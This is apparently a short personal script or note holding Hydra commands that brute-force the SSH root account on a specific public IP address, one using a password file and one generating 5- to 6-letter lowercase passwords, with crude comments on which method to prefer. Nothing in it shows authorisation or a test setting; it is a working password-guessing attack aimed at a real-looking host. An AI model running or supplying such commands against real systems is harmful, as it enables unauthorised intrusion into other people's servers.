# hydra -l root -P passwd.txt ssh://121.199.46.85 

# when you bruteforce, please do not use password file. use default shit instead.

# password list are handcrafted by the pro.

hydra -l root -x 5:6:a ssh://121.199.46.85
